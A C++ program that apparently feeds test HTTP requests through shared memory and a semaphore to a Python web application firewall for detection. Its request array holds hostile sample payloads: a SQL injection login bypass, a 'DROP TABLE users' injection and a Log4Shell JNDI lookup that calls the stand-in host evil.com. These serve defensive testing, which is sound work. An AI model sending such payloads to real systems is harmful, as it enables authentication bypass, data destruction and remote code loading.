#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/sem.h>

struct WAFPayload {
    int  ready;
    char method[16];
    char uri[256];
    char body[4096];
};

// Semaphore helper: LOCK (decrement — blocks if already 0)
void sem_lock(int semid) {
    struct sembuf op = {0, -1, 0};
    semop(semid, &op, 1);
}

// Semaphore helper: UNLOCK (increment — lets other side proceed)
void sem_unlock(int semid) {
    struct sembuf op = {0, 1, 0};
    semop(semid, &op, 1);
}

int main() {
    key_t key    = 0x1234;
    key_t semkey = 0x5678;  // separate key for the semaphore

    // Create shared memory
    int shmid = shmget(key, sizeof(WAFPayload), IPC_CREAT | 0666);
    if (shmid < 0) { perror("shmget"); return 1; }

    // Create semaphore
    int semid = semget(semkey, 1, IPC_CREAT | 0666);
    if (semid < 0) { perror("semget"); return 1; }

    // Initialize semaphore to 1 (unlocked)
    semctl(semid, 0, SETVAL, 1);

    WAFPayload *payload = (WAFPayload *)shmat(shmid, NULL, 0);
    if (payload == (void *)-1) { perror("shmat"); return 1; }

    std::cout << "C++ writer ready. Writing requests every 3 seconds...\n";

    // Simulate writing multiple requests over time
    const char *attacks[] = {
        "username=admin' OR '1'='1&password=x",
        "'; DROP TABLE users; --",
        "${jndi:ldap://evil.com/exploit}",
        "normal_user=john&password=hello123"
    };
    const char *uris[] = {"/login", "/search", "/log", "/home"};

    for (int i = 0; i < 4; i++) {
        sleep(3);

        sem_lock(semid);   // LOCK before writing

        payload->ready = 1;
        strncpy(payload->method, "POST",    sizeof(payload->method));
        strncpy(payload->uri,    uris[i],   sizeof(payload->uri));
        strncpy(payload->body,   attacks[i],sizeof(payload->body));

        sem_unlock(semid); // UNLOCK after writing

        std::cout << "C++ wrote: " << attacks[i] << std::endl;
    }

    std::cout << "All done! Keeping memory alive for Python..." << std::endl;
    while(true) { sleep(1); }

    shmdt(payload);
    shmctl(shmid, IPC_RMID, NULL);
    semctl(semid, 0, IPC_RMID);
    return 0;
}
